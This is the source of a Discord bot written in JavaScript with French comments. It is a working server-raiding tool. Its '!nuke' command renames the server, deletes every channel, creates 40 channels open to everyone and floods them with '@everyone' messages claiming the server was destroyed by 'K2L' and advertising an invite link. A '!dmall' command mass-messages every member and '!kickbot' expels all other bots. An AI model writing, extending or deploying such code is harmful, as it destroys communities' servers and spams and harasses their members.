const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const http = require('http');

// Serveur HTTP pour garder Render actif 24/7
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot Operational!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ]
});

// Liste des IDs autorisés (Toi et 40fd)
const OWNERS = ['1166445202148442112', '330080470983245824'];

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
});

// Anti-bot actif à l'arrivée
client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        try {
            await member.kick('Anti-bot activé.');
        } catch (err) {}
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    const isOwner = OWNERS.includes(message.author.id);

    // ==========================================
    // 1. COMMANDE !KICKBOT (Expulse TOUS les autres bots)
    // ==========================================
    if (message.content === '!kickbot') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("🤖 **[KICKBOT]** Nettoyage de tous les bots en cours...");

        try {
            const fetchedMembers = await message.guild.members.fetch();
            let count = 0;

            for (const [id, m] of fetchedMembers) {
                if (m.user.bot && m.id !== client.user.id) {
                    await m.kick('Kickbot - Nettoyage manuel').catch(() => {});
                    count++;
                }
            }

            await message.channel.send(`✅ **[KICKBOT]** Terminé ! ${count} bot(s) expulsé(s).`);
        } catch (error) {
            console.error("Erreur Kickbot :", error);
            message.channel.send("❌ Erreur lors de l'expulsion des bots.");
        }
    }

    // ==========================================
    // 2. COMMANDE !DMALL
    // ==========================================
    if (message.content === '!dmall') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");

        const filter = m => m.author.id === message.author.id;
        
        try {
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
            const m = collected.first();

            if (m.content.toLowerCase() === 'annuler') {
                return message.channel.send("❌ **Opération DMAll annulée.**");
            }

            const messageTemplate = m.content;

            const previewEmbed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                );

            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });

            const buttonFilter = i => OWNERS.includes(i.user.id);
            const buttonCollector = confirmMsg.createMessageComponentCollector({ filter: buttonFilter, time: 60000, max: 1 });

            buttonCollector.on('collect', async interaction => {
                if (interaction.customId === 'cancel_dmall') {
                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
                }

                if (interaction.customId === 'confirm_dmall') {
                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });

                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours..." });

                    try {
                        await message.guild.members.fetch();
                        const members = message.guild.members.cache.filter(member => !member.user.bot);

                        let successCount = 0;
                        let failCount = 0;

                        const promises = members.map(async member => {
                            try {
                                const finalMessage = messageTemplate
                                    .replace(/\{mention\}/g, `<@${member.id}>`)
                                    .replace(/\{name\}/g, member.user.username);
                                await member.send(finalMessage);
                                successCount++;
                            } catch (err) {
                                failCount++;
                            }
                        });

                        await Promise.all(promises);
                        await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });

                    } catch (error) {
                        message.channel.send("❌ Erreur lors du DMAll.");
                    }
                }
            });
        } catch (err) {
            message.channel.send("⌛ Temps écoulé.");
        }
    }

    // ==========================================
    // 3. COMMANDE !NUKE (Ultra-Fast + Salons avec Perms Overwrites)
    // ==========================================
    if (message.content === '!nuke') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("💥 **[NUKE]** Destruction en cours...");

        try {
            // A. Renommer le serveur en "/yuza"
            await message.guild.setName('/yuza').catch(() => {});

            // B. Suppression des salons existants
            const oldChannels = message.guild.channels.cache;
            oldChannels.forEach(channel => {
                channel.delete().catch(() => {});
            });

            // C. Création de salons avec dérogations de perms pour @everyone et flood direct
            for (let i = 0; i < 40; i++) {
                message.guild.channels.create({
                    name: 'ez-by-k2l',
                    type: 0, // Salon textuel
                    permissionOverwrites: [
                        {
                            id: message.guild.id, // Rôle @everyone
                            allow: [
                                PermissionsBitField.Flags.ViewChannel,
                                PermissionsBitField.Flags.SendMessages,
                                PermissionsBitField.Flags.ManageChannels,
                                PermissionsBitField.Flags.EmbedLinks,
                                PermissionsBitField.Flags.AttachFiles,
                                PermissionsBitField.Flags.MentionEveryone
                            ]
                        }
                    ]
                }).then(async channel => {
                    for (let j = 0; j < 10; j++) {
                        channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                    }
                }).catch(() => {});
            }

            await message.channel.send("✅ **Nuke exécuté avec succès !**");

        } catch (error) {
            console.error("Erreur Nuke :", error);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
